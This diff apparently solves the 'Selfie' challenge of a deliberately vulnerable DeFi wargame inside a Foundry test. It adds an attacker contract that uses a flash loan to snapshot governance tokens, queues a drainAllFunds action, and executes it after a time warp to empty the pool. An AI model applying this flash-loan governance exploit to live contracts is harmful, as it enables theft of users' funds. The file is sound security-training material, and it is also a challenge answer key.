@@ -47,6 +47,13 @@ contract Selfie is Test {
         /**
          * EXPLOIT START *
          */
+        vm.startPrank(attacker);
+        SelfieAttacker selfieAttacker =
+            new SelfieAttacker(address(selfiePool), address(simpleGovernance), address(dvtSnapshot));
+        selfieAttacker.attack(); // Use flashloan to take a ERC20 snapshot to acquire enough votes.
+        vm.warp(block.timestamp + 2 days); // 2 days
+        SimpleGovernance(simpleGovernance).executeAction(selfieAttacker.getActionId());
+        vm.stopPrank();
 
         /**
          * EXPLOIT END *
@@ -59,5 +66,36 @@ contract Selfie is Test {
         // Attacker has taken all tokens from the pool
         assertEq(dvtSnapshot.balanceOf(attacker), TOKENS_IN_POOL);
         assertEq(dvtSnapshot.balanceOf(address(selfiePool)), 0);
+    }
+}
+
+contract SelfieAttacker {
+    address selfiePool;
+    address simpleGovernance;
+    address dvtSnapshot;
+    address attacker;
+    uint256 actionId;
+
+    constructor(address selfiePool_, address simpleGovernance_, address dvtSnapshot_) {
+        selfiePool = selfiePool_;
+        simpleGovernance = simpleGovernance_;
+        dvtSnapshot = dvtSnapshot_;
+        attacker = msg.sender;
+    }
+
+    function attack() external payable {
+        SelfiePool(selfiePool).flashLoan(1_500_000e18);
+    }
+
+    function receiveTokens(address token, uint256 amount) external {
+        require(msg.sender == selfiePool, "selfiePool only");
+        DamnValuableTokenSnapshot(dvtSnapshot).snapshot();
+        bytes memory data = abi.encodeWithSignature("drainAllFunds(address)", attacker);
+        actionId = SimpleGovernance(simpleGovernance).queueAction(selfiePool, data, 0);
+        DamnValuableTokenSnapshot(token).transfer(selfiePool, 1_500_000e18);
+    }
+
+    function getActionId() external returns (uint256) {
+        return actionId;
     }
 }
